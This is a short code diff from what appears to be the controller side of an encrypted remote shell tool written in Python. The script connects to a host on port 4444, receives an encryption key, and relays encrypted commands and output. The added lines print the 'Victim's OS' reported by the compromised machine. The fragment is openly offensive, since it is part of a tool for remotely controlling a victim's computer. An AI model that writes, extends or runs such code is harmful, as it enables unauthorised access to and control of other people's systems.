@@ -34,6 +34,9 @@ conn.connect(('192.168.50.200',4444))
 key = conn.recv(1024)
 cipher = Fernet(key)
 
+operating_system = conn.recv(1024)
+print(f"Victim's OS => {operating_system.decode()}")
+
 print(Decrypt(conn.recv(1024)).decode(), end="")
 conn.send(Encrypt(input().encode()))
 print(Decrypt(conn.recv(1024)).decode(), end="")
